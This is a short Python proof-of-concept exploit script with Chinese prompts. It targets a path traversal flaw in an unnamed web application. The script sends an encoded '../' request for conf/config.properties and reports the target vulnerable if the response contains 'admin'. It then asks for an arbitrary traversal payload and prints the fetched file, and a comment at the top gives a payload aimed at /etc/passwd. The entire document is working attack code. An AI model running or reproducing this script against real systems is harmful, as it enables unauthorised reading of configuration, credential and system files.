#/..%2F..%2F..%2F..%2Fetc%2Fpasswd

import requests



def poc(target):

    path = "/..%2Fconf%2Fconfig.properties"
    url = 'http://' + target.replace('http://', '').replace('/', '')
    target_url = url + path
    #print(target_url)



    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.104 Safari/537.36",

    }

    response = requests.get(url=target_url, headers=headers)
    #print(response.text)

    if 'admin' in response.text and response.status_code == 200:
        x = True
        print("存在漏洞,执行exp")
        #exp(target)
        return x
    else:
        x = False
        print("[-]漏洞不存在")
        return x



def exp(target):
    url = 'http://' + target.replace('http://', '').replace('/', '')
    target_url = url + path
    #print(target_url)

    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.104 Safari/537.36",

    }

    response = requests.get(url=target_url, headers=headers)
    print(response.text)



if __name__ == "__main__":

    target = input("请出入目标地址:")
    x = poc(target)
    if x == True:
        path = input("请输入payload:")
        exp(target)
